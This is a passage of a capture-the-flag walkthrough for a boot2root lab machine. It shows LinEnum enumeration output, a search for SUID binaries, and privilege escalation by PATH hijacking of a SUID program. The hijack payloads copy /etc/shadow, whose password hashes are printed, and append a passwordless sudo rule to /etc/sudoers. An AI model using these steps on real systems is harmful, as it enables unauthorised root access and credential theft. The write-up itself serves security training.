root       629  0.0  5.4 298200 27300 ?        Ss   13:53   0:00 /usr/sbin/apache2 -k start
root       710  0.0  0.0   4192    88 ?        Ss   13:53   0:00 /usr/sbin/minissdpd -i 0.0.0.0
gemini1    935  0.2  2.5 299168 12692 ?        S    13:58   0:27 /usr/sbin/apache2 -k start
gemini1    936  0.2  2.5 299180 12924 ?        S    13:58   0:27 /usr/sbin/apache2 -k start
gemini1   1081  0.2  2.6 299168 13352 ?        S    14:17   0:28 /usr/sbin/apache2 -k start
gemini1   1082  0.2  2.7 299152 13708 ?        S    14:18   0:27 /usr/sbin/apache2 -k start
gemini1   1364  0.0  2.5 299168 12920 ?        S    15:37   0:00 /usr/sbin/apache2 -k start
gemini1   1383  0.0  2.5 299168 12912 ?        S    15:38   0:00 /usr/sbin/apache2 -k start
root      1463  0.0  0.0      0     0 ?        S    15:52   0:00 [kworker/u2:1]
gemini1   1550  0.0  2.5 299040 12900 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
gemini1   1551  0.0  2.5 299088 12900 ?        S    16:23   0:00 /usr/sbin/apache2 -k start
gemini1   1660  0.0  1.6 298696  8372 ?        S    16:36   0:00 /usr/sbin/apache2 -k start
gemini1   1763  0.0  2.5 298908 12656 ?        S    16:47   0:00 /usr/sbin/apache2 -k start
root      1764  0.0  0.0      0     0 ?        S    16:49   0:00 [kworker/0:0]
root      1778  0.0  1.3 101404  7060 ?        Ss   16:53   0:00 sshd: gemini1 [priv]
gemini1   1780  0.0  1.3  64868  6588 ?        Ss   16:53   0:00 /lib/systemd/systemd --user
gemini1   1781  0.0  0.3 234112  1680 ?        S    16:53   0:00 (sd-pam)
gemini1   1789  0.0  0.7 101404  3836 ?        S    16:53   0:00 sshd: gemini1@pts/0
gemini1   1790  0.0  0.9  20952  4980 pts/0    Ss   16:53   0:00 -bash
root      1800  0.0  0.0      0     0 ?        S    16:53   0:00 [kworker/u2:2]
root      1804  0.0  0.0      0     0 ?        S    16:54   0:00 [kworker/0:2]
root      1822  0.0  0.0      0     0 ?        S    16:59   0:00 [kworker/0:1]
gemini1   1832  0.0  0.7  12140  3980 pts/0    S+   17:01   0:00 bash LinEnum.sh
gemini1   1833  0.3  0.6  12184  3388 pts/0    S+   17:01   0:00 bash LinEnum.sh
gemini1   1834  0.0  0.1   5844   672 pts/0    S+   17:01   0:00 tee -a
systemd+  2003 49.0  0.8  49620  4060 ?        Ss   17:01   0:00 /lib/systemd/systemd-resolved
gemini1   2024  0.0  0.5  12184  2936 pts/0    S+   17:01   0:00 bash LinEnum.sh
gemini1   2025  0.0  0.6  38304  3360 pts/0    R+   17:01   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1.1M -rwxr-xr-x 1 root root 1.1M Jul  5  2017 /lib/systemd/systemd
116K -rwxr-xr-x 1 root root 115K Jul  5  2017 /lib/systemd/systemd-journald
204K -rwxr-xr-x 1 root root 203K Jul  5  2017 /lib/systemd/systemd-logind
316K -rwxr-xr-x 1 root root 315K Jul  5  2017 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K Jul  5  2017 /lib/systemd/systemd-timesyncd
456K -rwxr-xr-x 1 root root 455K Jul  5  2017 /lib/systemd/systemd-udevd
 60K -rwxr-xr-x 1 root root  57K Mar 22  2017 /sbin/agetty
480K -rwxr-xr-x 1 root root 477K Jan  8  2017 /sbin/dhclient
   0 lrwxrwxrwx 1 root root   20 Jul  5  2017 /sbin/init -> /lib/systemd/systemd
220K -rwxr-xr-x 1 root root 219K Oct  1  2017 /usr/bin/dbus-daemon
 16K -rwxr-xr-x 1 root root  15K May 24  2017 /usr/lib/policykit-1/polkitd
648K -rwxr-xr-x 1 root root 648K Sep 19  2017 /usr/sbin/apache2
 48K -rwxr-xr-x 1 root root  48K May  3  2015 /usr/sbin/cron
 32K -rwxr-xr-x 1 root root  31K May  8  2017 /usr/sbin/minissdpd
1.2M -rwxr-xr-x 1 root root 1.2M Nov 16  2016 /usr/sbin/ModemManager
 17M -rwxr-xr-x 1 root root  17M Aug 10  2017 /usr/sbin/mysqld
2.3M -rwxr-xr-x 1 root root 2.3M Mar 18  2017 /usr/sbin/NetworkManager
640K -rwxr-xr-x 1 root root 637K Jan 18  2017 /usr/sbin/rsyslogd
776K -rwxr-xr-x 1 root root 773K Nov 18 04:37 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 152
drwxr-xr-x   2 root root  4096 Jan  9 07:16 .
drwxr-xr-x 108 root root 12288 May 19 12:49 ..
-rwxr-xr-x   1 root root  5336 Feb  1  2016 alsa-utils
-rwxr-xr-x   1 root root  2014 May 29  2017 anacron
-rwxr-xr-x   1 root root  8181 Sep 19  2017 apache2
-rwxr-xr-x   1 root root  2225 Sep 19  2017 apache-htcacheclean
-rwxr-xr-x   1 root root  2401 Jan 23  2017 avahi-daemon
-rwxr-xr-x   1 root root  1232 Apr  6  2017 console-setup.sh
-rwxr-xr-x   1 root root  3049 May  3  2015 cron
-rwxr-xr-x   1 root root  2813 Oct  1  2017 dbus
-rwxr-xr-x   1 root root  3033 Mar 23  2016 gdm3
-rwxr-xr-x   1 root root  3809 Mar 22  2017 hwclock.sh
-rwxr-xr-x   1 root root  1479 May 18  2016 keyboard-setup.sh
-rwxr-xr-x   1 root root  2044 Dec 25  2016 kmod
-rwxr-xr-x   1 root root  2241 Apr 26  2017 minissdpd
-rwxr-xr-x   1 root root  5930 Aug 10  2017 mysql
-rwxr-xr-x   1 root root  4597 Sep 16  2016 networking
-rwxr-xr-x   1 root root  1757 Mar 18  2017 network-manager
-rwxr-xr-x   1 root root  4794 May 11  2017 php7.0-fpm
-rwxr-xr-x   1 root root   612 Dec  4  2015 pppd-dns
-rwxr-xr-x   1 root root  1191 Nov 22  2016 procps
-rwxr-xr-x   1 root root  4355 Dec 10 07:57 rsync
-rwxr-xr-x   1 root root  2868 Jan 18  2017 rsyslog
-rwxr-xr-x   1 root root  2330 May 21  2017 saned
-rwxr-xr-x   1 root root  2117 Aug  1  2017 speech-dispatcher
-rwxr-xr-x   1 root root  4033 Nov 18 04:35 ssh
-rwxr-xr-x   1 root root   731 Jun  5  2017 sudo
-rwxr-xr-x   1 root root  6087 Jul  5  2017 udev
-rwxr-xr-x   1 root root  1391 May  6  2017 unattended-upgrades


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.19p1


[-] MYSQL version:
mysql  Ver 15.1 Distrib 10.1.26-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2


[-] Apache user configuration:
APACHE_RUN_USER=gemini1
APACHE_RUN_GROUP=www-data


[-] www home dir contents:
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Jan  6 09:08 .
drwxr-xr-x 12 root root 4.0K Jan  6 09:08 ..
drwxr-xr-x  3 root root 4.0K Jan  9 07:23 html

/var/www/html:
total 12K
drwxr-xr-x 3 root root 4.0K Jan  9 07:23 .
drwxr-xr-x 3 root root 4.0K Jan  6 09:08 ..
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 test2

/var/www/html/test2:
total 104K
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 .
drwxr-xr-x 3 root root 4.0K Jan  9 07:23 ..
-rw-r--r-- 1 root root 1.2K Oct 28  2017 apple-touch-icon-114x114-precomposed.png
-rw-r--r-- 1 root root 1.5K Oct 28  2017 apple-touch-icon-144x144-precomposed.png
-rw-r--r-- 1 root root  730 Oct 28  2017 apple-touch-icon-57x57-precomposed.png
-rw-r--r-- 1 root root  854 Oct 28  2017 apple-touch-icon-72x72-precomposed.png
-rw-r--r-- 1 root root  730 Oct 28  2017 apple-touch-icon.png
-rw-r--r-- 1 root root  730 Oct 28  2017 apple-touch-icon-precomposed.png
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 css
-rw-r--r-- 1 root root  281 Jan  7 06:19 export.php
-rw-r--r-- 1 root root  766 Oct 28  2017 favicon.ico
-rw-r--r-- 1 root root 3.3K Jan  9 06:48 footer.php
-rw-r--r-- 1 root root 5.2K Jan  9 06:56 header.php
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 img
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 inc
-rw-r--r-- 1 root root  745 Jan  7 08:35 index.php
drwxr-xr-x 3 root root 4.0K Jan  9 07:10 js
drwxr-xr-x 3 root root 4.0K Jan  9 07:10 lib
-rw-r--r-- 1 root root 6.8K Jan  9 07:14 login.php
-rw-r--r-- 1 root root  170 Jan  9 07:02 logout.php
-rw-r--r-- 1 root root 2.6K Jan  9 07:08 profile.php
-rw-r--r-- 1 root root 6.9K Jan  9 07:07 user.php
-rw-r--r-- 1 root root  990 Jan  9 07:07 validate.php

/var/www/html/test2/css:
total 340K
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 ..
-rw-r--r-- 1 root root 125K Oct 28  2017 bootstrap.css
-rw-r--r-- 1 root root 104K Oct 28  2017 bootstrap.min.css
-rw-r--r-- 1 root root  22K Oct 28  2017 bootstrap-responsive.css
-rw-r--r-- 1 root root  17K Oct 28  2017 bootstrap-responsive.min.css
-rw-r--r-- 1 root root  24K Oct 28  2017 darkstrap.css
-rw-r--r-- 1 root root  21K Oct 28  2017 darkstrap.min.css
-rw-r--r-- 1 root root  566 Jan  7 01:36 index.html
-rw-r--r-- 1 root root  715 Oct 28  2017 main.css

/var/www/html/test2/img:
total 52K
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 ..
-rw-r--r-- 1 root root 6.2K Oct 28  2017 default-avatar.png
-rw-r--r-- 1 root root  13K Oct 28  2017 glyphicons-halflings.png
-rw-r--r-- 1 root root 8.6K Oct 28  2017 glyphicons-halflings-white.png
-rw-r--r-- 1 root root  428 Jan  7 01:36 index.html
-rw-r--r-- 1 root root 2.3K Oct 28  2017 valid.png

/var/www/html/test2/inc:
total 20K
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 ..
-rw-r--r-- 1 root root  266 Jan  7 01:36 index.html
-rw-r--r-- 1 root root 1.8K Oct 28  2017 init.php
-rw-r--r-- 1 root root  341 Jan  7 01:40 settings.php

/var/www/html/test2/js:
total 20K
drwxr-xr-x 3 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 ..
-rw-r--r-- 1 root root  252 Jan  7 01:36 index.html
-rw-r--r-- 1 root root  632 Oct 28  2017 main.js
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 vendor

/var/www/html/test2/js/vendor:
total 240K
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 3 root root 4.0K Jan  9 07:10 ..
-rw-r--r-- 1 root root  61K Oct 28  2017 bootstrap.js
-rw-r--r-- 1 root root  28K Oct 28  2017 bootstrap.min.js
-rw-r--r-- 1 root root  508 Jan  7 01:36 index.html
-rw-r--r-- 1 root root  91K Oct 28  2017 jquery-1.9.1.min.js
-rw-r--r-- 1 root root  22K Oct 28  2017 jquery.validate.min.js
-rw-r--r-- 1 root root  20K Oct 28  2017 modernizr-2.6.2-respond-1.1.0.min.js

/var/www/html/test2/lib:
total 64K
drwxr-xr-x 3 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 7 root root 4.0K Jan  9 07:14 ..
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 captcha
-rw-r--r-- 1 root root  490 Jan  7 01:36 index.html
-rw-r--r-- 1 root root  22K Oct 28  2017 mysql.class.php
-rw-r--r-- 1 root root 4.5K Oct 28  2017 options.class.php
-rw-r--r-- 1 root root  987 Oct 28  2017 pagination.class.php
-rw-r--r-- 1 root root 1.4K Jan  9 07:05 presets.class.php
-rw-r--r-- 1 root root 6.0K Jan  9 07:06 users.class.php

/var/www/html/test2/lib/captcha:
total 828K
drwxr-xr-x 2 root root 4.0K Jan  9 07:10 .
drwxr-xr-x 3 root root 4.0K Jan  9 07:10 ..
-rw-r--r-- 1 root root 5.9K Jan  9 07:07 captcha.php
-rw-r--r-- 1 root root 8.1K Oct 28  2017 default.png
-rw-r--r-- 1 root root  384 Jan  7 01:36 index.html
-rw-r--r-- 1 root root   29 Oct 28  2017 index.php
-rw-r--r-- 1 root root 789K Oct 28  2017 times_new_yorker.ttf


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


[-] Installed compilers:
ii  g++                                   4:6.3.0-4                         amd64        GNU C++ compiler
ii  g++-6                                 6.3.0-18                          amd64        GNU C++ compiler
ii  gcc                                   4:6.3.0-4                         amd64        GNU C compiler
ii  gcc-6                                 6.3.0-18                          amd64        GNU C compiler
ii  libllvm3.9:amd64                      1:3.9.1-9                         amd64        Modular compiler and toolchain technologies, runtime library
ii  libxkbcommon0:amd64                   0.7.1-2~deb9u1                    amd64        library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1930 Jan  7 06:57 /etc/passwd
-rw-r--r-- 1 root root 883 Jan  7 06:57 /etc/group
-rw-r--r-- 1 root root 767 Mar  4  2016 /etc/profile
-rw-r----- 1 root shadow 1187 Jan  7 06:57 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 7431 Jan  6 08:26 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 346 Nov 30  2016 /etc/discover-modprobe.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 1963 Jan 18  2017 /etc/rsyslog.conf
-rw-r--r-- 1 root root 552 May 27  2017 /etc/pam.conf
-rw-r--r-- 1 root root 2584 Aug  1  2016 /etc/gai.conf
-rw-r--r-- 1 root root 1018 Jan 23  2017 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 191 Apr 12  2017 /etc/libaudit.conf
-rw-r--r-- 1 root root 10368 Apr  5  2017 /etc/sensors3.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 2683 Nov 22  2016 /etc/sysctl.conf
-rw-r--r-- 1 root root 3173 May 29  2017 /etc/reportbug.conf
-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
-rw-r--r-- 1 root root 2981 Jan  6 08:08 /etc/adduser.conf
-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
-rw-r--r-- 1 root root 769 Jan 22  2017 /etc/appstream.conf
-rw-r--r-- 1 root root 529 Jan  7 06:47 /etc/nsswitch.conf
-rw-r--r-- 1 root root 973 Jan 31  2017 /etc/mke2fs.conf
-rw-r--r-- 1 root root 2969 May 21  2017 /etc/debconf.conf
-rw-r--r-- 1 root root 599 May  5  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 144 Jan  6 08:46 /etc/kernel-img.conf
-rw-r--r-- 1 root root 4988 Mar 11  2017 /etc/rygel.conf
-rw-r--r-- 1 root root 4781 Jan 24  2017 /etc/hdparm.conf
-rw-r--r-- 1 root root 34 Apr  9  2017 /etc/ld.so.conf
-rw-r--r-- 1 root root 26 Oct 30  2016 /etc/libao.conf
-rw-r--r-- 1 root root 433 Aug  5  2016 /etc/apg.conf


[-] Current user's history files:
-rw------- 1 gemini1 gemini1 4176 Jan  9 08:05 /home/gemini1/.bash_history


LinEnum.sh: line 1388: warning: command substitution: ignored null byte in input
[-] Location and contents (if accessible) of .bash_history file(s):
/home/gemini1/.bash_history

exit
cd
ls
nano test.sh
chmod ugo+x test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
./test.sh
nano test.sh
mv test.sh setup_hostname.sh
nano setup_hostname.sh
mv setup_hostname.sh /etc/init.d/
su root
ls -al /etc/rc*.d
ls -al /etc/rc*.d | grep setup
for i in `find /etc/rc*.d -name S*`; do basename $i | sed -r 's/^S[0-9]+//'; done | sort | uniq
ls /etc/init.d/
ls /etc/rc.local
ls -al /etc/init.d/setup_hostname.sh
exit
ls
clear
ls -al
cd /var/www/html
ls
cd test2
ls
cd inc/
ls
cat settings.php
cat init.php
ls
cd ..
ls
grep "172.16.6.180" .
grep "172.16.6.180"
grep "172.16.6.180" *
cd css/
ls
cat main.css
ls
cd ..
ls
grep 172.16.6.180
grep "172.16.6.180"
grep -irn "172.16.6.180"
grep -iRn "172.16.6.180"
grep -iRn "172.16.6.180" .
grep -iRn "172.16.6.180" *
cat index.php
cd inc/
ls
cat in
cat init.php
cat init.php  | grep 172
cd ../lib/
ls
cat options.class.php | grep 172
cat presets.class.php | grep 172
cat users.class.php | grep 172
cd /
ls
grep -iRn "172.16.6.180"
exit
ifconfig
/sbin/ifconfig
/sbin/ifconfig | grep inet
ip addr show
ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
/sbin/ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
exit
ifconfig
/sbin/ifconfig
clear
uname -ar
cat /etc/*release
clear
pwd
ls -al
exit


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Jan  6 08:08 .
drwxr-xr-x 12 root root 4096 Jan  6 09:08 ..


### SCAN COMPLETE ####################################
gemini1@geminiinc:~$
```
 
**`find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)`**

```sh
gemini1@geminiinc:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-- 1 root dip 365960 Nov 11  2016 /usr/sbin/pppd
-rwsr-xr-x 1 root root 23352 May 24  2017 /usr/bin/pkexec
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 8792 Jan  7 06:10 /usr/bin/listinfo
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 44304 Mar 22  2017 /bin/mount
-rwsr-xr-x 1 root root 31720 Mar 22  2017 /bin/umount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 30800 Jun 23  2016 /bin/fusermount
gemini1@geminiinc:~$
```

###### Binary Hijacking

```sh
gemini1@geminiinc:~$ /usr/bin/listinfo
displaying network information...            inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
displaying network information...            inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN

displaying current date...    Sat May 19 17:09:55 EDT 2018
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ strings /usr/bin/listinfo
/lib64/ld-linux-x86-64.so.2
(J/O<
libc.so.6
popen
printf
fgets
pclose
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
=q
5j
=!
AWAVA
AUATL
[]A\A]A^A_
/sbin/ifconfig | grep inet
/bin/netstat -tuln | grep 22
/bin/netstat -tuln | grep 80
date
displaying network information...
displaying Apache listening port...
displaying SSH listening port...
displaying current date...
;*3$"
GCC: (Debian 6.3.0-18) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6963
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
testprogram.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
printf@@GLIBC_2.2.5
pclose@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
popen@@GLIBC_2.2.5
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
gemini1@geminiinc:~$
```

- Vulnerable Code

```
/sbin/ifconfig | grep inet
/bin/netstat -tuln | grep 22
/bin/netstat -tuln | grep 80
date
```

```sh
gemini1@geminiinc:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
gemini1@geminiinc:~$
gemini1@geminiinc:~$ pwd
/home/gemini1
gemini1@geminiinc:~$
gemini1@geminiinc:~$ export PATH=/home/gemini1:$PATH
gemini1@geminiinc:~$
gemini1@geminiinc:~$ echo $PATH
/home/gemini1:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ cat date
echo "[*] BINARY HIJACKING TEST [*]"
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ chmod +x date
```

```sh
gemini1@geminiinc:~$ listinfo
displaying network information...            inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
displaying network information...            inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN

displaying current date...    [*] BINARY HIJACKING TEST [*]
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ cat date
id
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ listinfo
displaying network information...            inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
displaying network information...            inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN

displaying current date...    uid=1000(gemini1) gid=1000(gemini1) euid=0(root) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ cat date
cat /etc/shadow > /tmp/stolen_shadow
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ listinfo
displaying network information...            inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
displaying network information...            inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ cat /tmp/stolen_shadow
root:$6$Da48cIYl$15Xy.q2p2DV8IjVsNqEfEbgVmYfGbBz.QA6qZ2urIdM92uYgkKjUrHgiXUiyPkFMgtACK4gEWgGSnu2y129/Y/:17537:0:99999:7:::
daemon:*:17537:0:99999:7:::
bin:*:17537:0:99999:7:::
sys:*:17537:0:99999:7:::
sync:*:17537:0:99999:7:::
games:*:17537:0:99999:7:::
man:*:17537:0:99999:7:::
lp:*:17537:0:99999:7:::
mail:*:17537:0:99999:7:::
news:*:17537:0:99999:7:::
uucp:*:17537:0:99999:7:::
proxy:*:17537:0:99999:7:::
www-data:*:17537:0:99999:7:::
backup:*:17537:0:99999:7:::
list:*:17537:0:99999:7:::
irc:*:17537:0:99999:7:::
gnats:*:17537:0:99999:7:::
nobody:*:17537:0:99999:7:::
systemd-timesync:*:17537:0:99999:7:::
systemd-network:*:17537:0:99999:7:::
systemd-resolve:*:17537:0:99999:7:::
systemd-bus-proxy:*:17537:0:99999:7:::
_apt:*:17537:0:99999:7:::
dnsmasq:*:17537:0:99999:7:::
messagebus:*:17537:0:99999:7:::
usbmux:*:17537:0:99999:7:::
geoclue:*:17537:0:99999:7:::
avahi:*:17537:0:99999:7:::
colord:*:17537:0:99999:7:::
saned:*:17537:0:99999:7:::
hplip:*:17537:0:99999:7:::
Debian-gdm:*:17537:0:99999:7:::
gemini1:$6$nc41buYu$NtZAtt/xaYN2m6M5K.NBbCK0FSUlKRCK9tqK06aa9U4DDC3Ask6jqhWxyuN0BTgqrIrSJ2p/RaTDwOaalFU.s/:17537:0:99999:7:::
sshd:*:17537:0:99999:7:::
mysql:!:17537:0:99999:7:::
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ cat date
whoami
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ listinfo
displaying network information...            inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
displaying network information...            inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN

displaying current date...    root
gemini1@geminiinc:~$
```

[Add `gemini1` user as a passwordless `sudo` user](https://serverfault.com/questions/160581/how-to-setup-passwordless-sudo-on-linux)

```sh
gemini1@geminiinc:~$ sudo -l
[sudo] password for gemini1:
Sorry, try again.
[sudo] password for gemini1:
sudo: 1 incorrect password attempt
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ cat date
echo "gemini1 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ listinfo
displaying network information...            inet 192.168.1.14  netmask 255.255.255.0  broadcast 192.168.1.255
displaying network information...            inet6 fe80::20c:29ff:fe65:22bd  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ sudo -l
Matching Defaults entries for gemini1 on geminiinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gemini1 may run the following commands on geminiinc:
    (ALL) NOPASSWD: ALL
gemini1@geminiinc:~$
```

```sh
gemini1@geminiinc:~$ sudo su -
root@geminiinc:~# ls -lah
total 36K
drwx------  4 root root 4.0K Jan  7 07:22 .
drwxr-xr-x 23 root root 4.0K Jan  6 08:32 ..
-rw-------  1 root root 3.5K Jan  9 09:35 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4.0K Jan  6 08:56 .cache
-rw-r--r--  1 root root  389 Jan  7 06:17 flag.txt
-rw-------  1 root root 3.1K Jan  7 07:22 .mysql_history
drwxr-xr-x  2 root root 4.0K Jan  7 00:30 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
root@geminiinc:~# cat flag.txt
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm

Congratulations on solving this boot2root machine!
Cheers!
         _.._..,_,_
        (          )
         ]~,"-.-~~[
       .=])' (;  ([
       | ]:: '    [
       '=]): .)  ([
         |:: '    |
          ~~----~~
https://twitter.com/sec_9emin1
https://scriptkidd1e.wordpress.com

